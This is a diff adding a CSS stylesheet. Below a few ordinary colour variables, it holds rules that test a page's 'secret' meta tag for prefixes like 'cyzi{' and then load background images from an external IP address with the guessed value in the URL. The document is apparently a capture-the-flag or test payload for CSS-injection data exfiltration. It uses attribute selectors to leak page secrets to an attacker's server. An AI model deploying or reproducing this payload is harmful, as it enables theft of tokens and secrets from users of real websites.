@@ -1,0 +1,29 @@
+:root {
+    --bg: yellow;
+    --text: black;
+    --primary: blue;
+    --secondary: gray;
+    --border: lightgray;
+    --red: red;
+    --blue: blue;
+}
+
+html:has(meta[name=secret][content^="cyziX"]) {
+    background-image: url(http://167.99.47.105:4444?secret=cyziX);
+}
+
+html:has(meta[name=secret][content^="cyzi{"]) {
+    background-image: url(http://167.99.47.105:4444?secret=HTTP_OK);
+}
+
+html:has(meta[name=secret][content^="cyzi{"]) {
+    background-image: url(https://167.99.47.105:4444?secret=HTTPS_OK);
+}
+
+html:has(meta[name=secret][content^="nah... y"]) {
+    background-image: url(http://167.99.47.105:4444?secret=HTTP_TEST_OK);
+}
+
+html:has(meta[name=secret][content^="nah... y"]) {
+    background-image: url(https://167.99.47.105:4444?secret=HTTPS_TEST_OK);
+}
